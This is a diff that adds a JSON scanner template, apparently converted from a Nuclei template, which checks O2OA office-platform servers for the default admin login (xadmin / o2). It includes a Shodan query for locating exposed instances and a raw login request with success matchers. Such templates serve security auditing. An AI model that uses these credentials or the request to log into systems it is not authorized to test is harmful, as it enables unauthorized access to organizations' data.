@@ -1,0 +1,173 @@
+{
+  "id": "o2oa-default-login",
+  "name": "O2OA - Default Login",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "O2OA is an open source and free enterprise and team office platform. It provides four major platforms portal management, process management, information management, and data management. It integrates many functions such as work reporting, project collaboration, mobile OA, document sharing, process approval, and data collaboration. Meet various management and collaboration needs of enterprises.\n",
+  "tags": [
+    "o2oa",
+    "default-login"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "title\u003d\u003d\"O2OA\""
+  },
+  "variables": {
+    "password": [
+      "o2"
+    ],
+    "username": [
+      "xadmin"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /x_organization_assemble_authentication/jaxrs/authentication/captcha HTTP/1.1\nHost: {{Hostname}}\nCookie: x-token\u003danonymous\nAuthorization: anonymous\nAccept: text/html,application/json,*/*\nContent-Type: application/json; charset\u003dUTF-8\n\n{\"credential\":\"{{username}}\",\"password\":\"{{password}}\"}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\"type\": \"success\"",
+            "distinguishedName"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "application/json"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "o2oa-default-login",
+    "info": {
+      "name": "O2OA - Default Login",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "O2OA is an open source and free enterprise and team office platform. It provides four major platforms portal management, process management, information management, and data management. It integrates many functions such as work reporting, project collaboration, mobile OA, document sharing, process approval, and data collaboration. Meet various management and collaboration needs of enterprises.\n",
+      "classification": {},
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "title\u003d\u003d\"O2OA\""
+      },
+      "tags": "o2oa,default-login"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "username": [
+            "xadmin"
+          ],
+          "password": [
+            "o2"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /x_organization_assemble_authentication/jaxrs/authentication/captcha HTTP/1.1\nHost: {{Hostname}}\nCookie: x-token\u003danonymous\nAuthorization: anonymous\nAccept: text/html,application/json,*/*\nContent-Type: application/json; charset\u003dUTF-8\n\n{\"credential\":\"{{username}}\",\"password\":\"{{password}}\"}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\"type\": \"success\"",
+              "distinguishedName"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "application/json"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
